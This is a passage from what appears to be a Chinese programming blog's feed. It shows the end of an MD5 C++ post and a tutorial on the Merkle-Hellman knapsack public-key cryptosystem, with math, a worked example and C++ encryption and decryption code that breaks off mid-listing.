是一个格式说明符，它将以两位十六进制格式打印一个字节，并在需要时在前面补零。</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, ptr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;----------------- MD5 -----------------\n&quot;</span>;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;请输入要加密的明文. (如果要终止程序请按CTRL + C)\n&quot;</span>;</span><br><span class="line">   string str;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;text: &quot;</span>;</span><br><span class="line">   <span class="built_in">getline</span>(cin, str);</span><br><span class="line">   <span class="comment">//__uint128_t一个无符号的128位整数,可存储的值（2^128 - 1）</span></span><br><span class="line">   <span class="type">__uint128_t</span> md5 = <span class="built_in">MD5</span>(str);</span><br><span class="line"></span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;result: &quot;</span>;</span><br><span class="line">   <span class="comment">// 注意这个md5类型是__uint128_t，我们需要的是能将这个整数以16进制输出</span></span><br><span class="line">   <span class="built_in">MD5_Print</span>(md5);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------------- MD5 -----------------</span><br><span class="line">请输入要加密的明文. (如果要终止程序请按CTRL + C)</span><br><span class="line">text: iscbupt</span><br><span class="line">result: <span class="number">16838</span>a414adaec12d8d86f735fd183b7</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">MD5算法加解密原理及C++代码</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="MD5算法" scheme="https://nonevector.top/tags/MD5%E7%AE%97%E6%B3%95/"/>
    
    <category term="Hash算法" scheme="https://nonevector.top/tags/Hash%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>公钥密码体制之MH背包公钥加密体制</title>
    <link href="https://nonevector.top/posts/10.html"/>
    <id>https://nonevector.top/posts/10.html</id>
    <published>2023-11-06T10:14:08.999Z</published>
    <updated>2023-11-29T03:35:38.699Z</updated>
    
    <content type="html"><![CDATA[<p>公钥密码体制中,除了 RSA、EIGamal 和圆曲线加密体制以外，还有很多其他公钥密码算法，但由于各种原因它们的应用都不如上述算法广泛,本篇将对一些其他重要公钥密码算法，MH 背包公钥加密体制的原理作简要的介绍。</p><p>看到背包很熟悉？有关系，但不多<s>如有</s>。（温馨提示：如果忘记背包请随时复习我们最经典的<a href="https://www.cnblogs.com/jbelial/articles/2116074.html">背包九讲</a>😋）</p><h2 id="1-MH-背包公钥加密体制介绍"><a href="http://1.MH">1.MH</a> 背包公钥加密体制介绍</h2><p>背包公钥加密体制是由 Ralph Merkle 和 Martin Hellman 于 1978 年首提出的，它是第一个公钥加密算法，其安全性基于背包难题。尽管这个算法后来发现是不安全的,但是由于它实现了如何将 NP 完全问题用于设计公钥密码算法,所以其设计思想很值得借鉴和研究。</p><p>背包问题描述起来很简单:给定一堆物品,每个重量不同,能否将这些物品中的几件放入一个背包中使之等于一个给定的重量?数学描述为:给定一个正整数集$A=(a_1,a_2,\ldots ,a_n)$(称为背包向量),已知<code>S</code>是<code>A </code>的某子集合<code>A'</code>中元素的和。求<code>A'</code>或者求一个<code>n</code>元的<code>0、1</code>向量$X=(x_1,x_2,\ldots,x_n)$使得:</p><p>$$<br>\sum_{i=1}^{n}{x_ia_i} = S<br>$$</p><p>Merkle 和 Hellman 提出的背包公加密体制(简称 MH 背包密码)是利用<strong>超递增序列的背包问题</strong>来实现的(简称超递增背包问题)。所谓超递增序列,是指这个序列的每一项都大于它之前所有项之和，即对于任意<code>j&gt;1</code>,有:</p><p>$$<br>a_j &gt; \sum_{i = 1}^{j - 1}{a_i}<br>$$</p><p>例如，<code>(1,3,6,13,27,52)</code>就是一个超递增序列。超递增背包问题的解很容易找到,用 <code>S</code>与<code>A</code>的最后一项$a_n$，比较,如果 $S&lt; a_n$,则它不在背包中令$x_n=0$;如果 $S&gt;a_n$,则它在背包中,令$x_n = 1$,并令$ S=S-a_n$。进而考查序列下一个最大的数$ a_n-1$,重复到最后一个数比较结束如果总重量减为零,那么有一个解,否则无解。而一般背包问题是困难的,它目前没有多项式时间的算法。求解若使用穷搜法,则最坏情况下需遍历$ 2^n$个子集合, <code>n</code>较大时,非常困难。MH 背包公钥加密体制利用了超递增序列作为私钥，公钥则是有相同解的一般背包向量。</p><h2 id="2-密钥生成算法">2.密钥生成算法</h2><p>令 A={$a_1,a_2,\ldots,a_n$}是一个超递增整数序列,取素数 $p、b,p&gt; \sum_{i = 1}^{n}{a_i},1 \leq b \leq p-1$,计算$t_i\equiv ba_i(mod p),1 \leq i \leq n$。则公钥为$t=(t_1,t_2,\ldots,t_n)$和<code>p</code>,私钥为<code>A</code>和<code>b</code>。</p><h3 id="C-代码">C++ 代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len; <span class="comment">// 设置超递增序列长度（随便）</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> A[N];<span class="comment">//私钥</span></span><br><span class="line"><span class="type">int</span> b;<span class="comment">//私钥</span></span><br><span class="line"><span class="type">int</span> p;<span class="comment">//公钥</span></span><br><span class="line"><span class="type">int</span> t[N];<span class="comment">//公钥</span></span><br><span class="line"><span class="type">int</span> sum;<span class="comment">//A[N]前len项和</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> primes[N];</span><br><span class="line"><span class="type">int</span> cnt;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">()</span></span>&#123; <span class="comment">//线性筛法得质数</span></span><br><span class="line">    <span class="type">int</span> n = N;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!st[i]) primes[cnt++]=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;primes[j]&lt;=n/i;j++)&#123;</span><br><span class="line">            st[primes[j]*i]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(i%primes[j]==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_A</span><span class="params">()</span> <span class="comment">// 初始化超递增序列，随便写的，满足调价即可</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    sum += A[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] = sum + <span class="number">1</span>;</span><br><span class="line">        sum += A[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请设置超递增序列长度&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; len;</span><br><span class="line">    <span class="built_in">init_A</span>();</span><br><span class="line">    <span class="built_in">get_primes</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(primes[i] &gt; sum)</span><br><span class="line">        &#123;</span><br><span class="line">            p = primes[i];</span><br><span class="line">            b = primes[i - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;公钥集合&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;t:&quot;</span> ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ ) cout &lt;&lt; (b * A[i]) % p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p:&quot;</span> &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;私钥集合&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;A:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ ) cout &lt;&lt; A[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;b:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">请设置超递增序列长度</span><br><span class="line"><span class="number">8</span></span><br><span class="line">公钥集合</span><br><span class="line">t:<span class="number">251</span> <span class="number">245</span> <span class="number">233</span> <span class="number">209</span> <span class="number">161</span> <span class="number">65</span> <span class="number">130</span> <span class="number">3</span></span><br><span class="line">p:<span class="number">257</span></span><br><span class="line">私钥集合</span><br><span class="line">A:<span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">8</span> <span class="number">16</span> <span class="number">32</span> <span class="number">64</span> <span class="number">128</span></span><br><span class="line">b:<span class="number">251</span></span><br></pre></td></tr></table></figure><h2 id="3-加解密算法-肥肠简单">3.加解密算法(肥肠简单)</h2><p><strong>加密算法</strong>:设明文块二进制表示为 $m=m_1m_2\ldots m_n$,则使用加密算法$c \equiv \sum_{i = 1}^{n}{t_im_i}(mod p)$,计算出密文 c,发送给接收方。</p><p><strong>解密算法</strong>:通过公式$S\equiv b^{-1}c(mod p)$计算得到 S,对超递增序列$A=(a_1,a_2,\ldots,a_n)$及整数 S 利用超递增背包问题求解算法恢复出明文$m_1m_2\ldots m_n$。</p><h3 id="求逆元！！！！">求逆元！！！！</h3><blockquote><p>这里只介绍快速幂求逆元，如若需要知道快速幂，<a href="https://www.nonevector.top/posts/9.html">点击直达</a></p></blockquote><p>前提</p><blockquote><p>费马小定理：若 p 是质数，整数 b 不是 p 的倍数，则 b^(p−1)≡1(modp).</p><p>我们可以将式子变形：b⋅b^p−2≡1(modp)，所以 binv=b^p−2</p></blockquote><p>当 n 为质数时，可以用快速幂求逆元：</p><p>a / b ≡ a _ x (mod n)<br>两边同乘 b 可得 a ≡ a _ b _ x (mod n)<br>即 1 ≡ b _ x (mod n)<br>同 b * x ≡ 1 (mod n)<br>由费马小定理可知，当 n 为质数时</p><p>b ^ (n - 1) ≡ 1 (mod n)<br>拆一个 b 出来可得 b * b ^ (n - 2) ≡ 1 (mod n)<br>故当 n 为质数时，b 的乘法逆元 x = b ^ (n - 2)</p><p>当 n 不是质数时，可以用扩展欧几里得算法求逆元：<br>a 有逆元的充要条件是 a 与 p 互质，所以 gcd(a, p) = 1<br>假设 a 的逆元为 x，那么有 a * x ≡ 1 (mod p)<br>等价：ax + py = 1<br>exgcd(a, p, x, y)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 说实话感觉一两句讲不清楚，想要了解自行了解吧，这里直接用代码吧😥</span></span><br><span class="line"><span class="function">LL <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> p)</span> <span class="comment">// 快速幂求逆元</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(b &amp; <span class="number">1</span>) res = res * a % p;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-样例">4.样例</h2><p>已知<code>A=(1,3,7,13,26,65,119,267)</code>是超递增序列,作为私钥,求解一个公钥,并利用这个公私钥对对明文 <code>10101100</code>实现加解密。</p><p><strong>解:</strong></p><p>由于<code>1+3+7+13+26+65+119+267=501</code><br>取 p=523,b=467,得$b^{-1}\equiv 28mod 532$。<br>则:</p><p>$$<br>t_1 \equiv 467 \times 1 \equiv 467(mod 523) \<br>$$</p><p>$$<br>t_2 \equiv 467 \times 3 \equiv 355(mod 523)  \<br>$$</p><p>$$<br>t_3 \equiv 467 \times 7 \equiv 131(mod 523)  \<br>$$</p><p>$$<br>t_4 \equiv 467 \times 13 \equiv 318(mod 523)  \<br>$$</p><p>$$<br>t_5 \equiv 467 \times 26 \equiv 113(mod 523)  \<br>$$</p><p>$$<br>t_6 \equiv 467 \times 65 \equiv 21(mod 523)  \<br>$$</p><p>$$<br>t_7 \equiv 467 \times 119 \equiv 135(mod 523)  \<br>$$</p><p>$$<br>t_8 \equiv 467 \times 215 \equiv 215(mod 523)  \<br>$$</p><p>可得,<code>A </code>和<code>b</code>为私钥,与之对应的公钥:(467,355,131,318,113,21,135,215)和 p。</p><p>对于明文 10101100 加密得密文:</p><p>$$<br>t_1+t_3+t_5+t_6=467+131+113+21=732<br>$$</p><p>接收方收到密文 732 后计算:</p><p>$$<br>732\times 28=20496\equiv 99(mod 523)<br>$$</p><p>解超递增序列背包问题:</p><p>$$<br>m_1+3m_2+7m_3+13m_4+26m_5+65m_6+119m_7+267m_8=99(mod 523)<br>$$</p><p>得到$m_1=m_3=m_5=m_6 = 1,m_2=m_4=m_7=m_8=0$,即得明文:10101100。</p><h2 id="5-C-代码">5.C++代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len; <span class="comment">// 设置超递增序列长度（随便）</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> A[N];<span class="comment">//私钥</span></span><br><span class="line"><span class="type">int</span> b;<span class="comment">//私钥</span></span><br><span class="line"><span class="type">int</span> p;<span class="comment">//公钥</span></span><br><span class="line"><span class="type">int</span> t[N];<span class="comment">//公钥</span></span><br><span class="line"><span class="type">int</span> sum;<span class="comment">//A[N]前len项和</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> primes[N];</span><br><span class="line"><span class="type">int</span> cnt;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line">string clear_text;  <span class="comment">//明文</span></span><br><span class="line">string secret_text; <span class="comment">//密文</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> byt[N]; <span class="comment">// 用于辅助找到明文二进制</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> res;<span class="comment">//选择加密还是解密</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">()</span></span>&#123; <span class="comment">//线性筛法得质数</span></span><br><span class="line">    <span class="type">int</span> n = N;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!st[i]) primes[cnt++]=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;primes[j]&lt;=n/i;j++)&#123;</span><br><span class="line">            st[primes[j]*i]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(i%primes[j]==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> <span class="comment">// 初始化获取私钥和公钥（上面有注释这里就不详细给了）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    sum += A[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] = sum + <span class="number">1</span>;</span><br><span class="line">        sum += A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(primes[i] &gt; sum)</span><br><span class="line">        &#123;</span><br><span class="line">            p = primes[i];</span><br><span class="line">            b = primes[i - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ ) t[i] =  (b * A[i]) % p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> p)</span> <span class="comment">// 快速幂求逆元</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b &amp; <span class="number">1</span>) res = res * a % p;</span><br><span class="line"></span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        a = (LL) a * a % p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u &gt;= len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> all = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            all += byt[i] * A[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(all == s)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(byt[i]) clear_text += <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span> clear_text += <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    byt[u] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(u + <span class="number">1</span>, s);</span><br><span class="line">    byt[u] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(u + <span class="number">1</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;<span class="comment">//密文c</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            c += t[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    secret_text = <span class="built_in">to_string</span>(c);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后得密文:&quot;</span> &lt;&lt; secret_text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="function">std::istringstream <span class="title">ss</span><span class="params">(str)</span></span>;</span><br><span class="line">    ss &gt;&gt; c;</span><br><span class="line">    <span class="type">int</span> down = <span class="built_in">qmi</span>(b, p - <span class="number">2</span>, p); <span class="comment">// b得逆元</span></span><br><span class="line">    <span class="type">int</span> s = down * c % p;</span><br><span class="line">    <span class="comment">// 能力不够，应该能用DP，但是俺不会，只会最简单得dfs😋</span></span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>, s); <span class="comment">// dfs遍历00000000-11111111</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;解密后的明文:&quot;</span> &lt;&lt; clear_text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入1选择加密，或者输入2选择解密&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请设置超递增序列长度&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; len;</span><br><span class="line">    <span class="built_in">get_primes</span>();</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; clear_text;</span><br><span class="line">        <span class="built_in">encrypt</span>(clear_text);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入密文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; 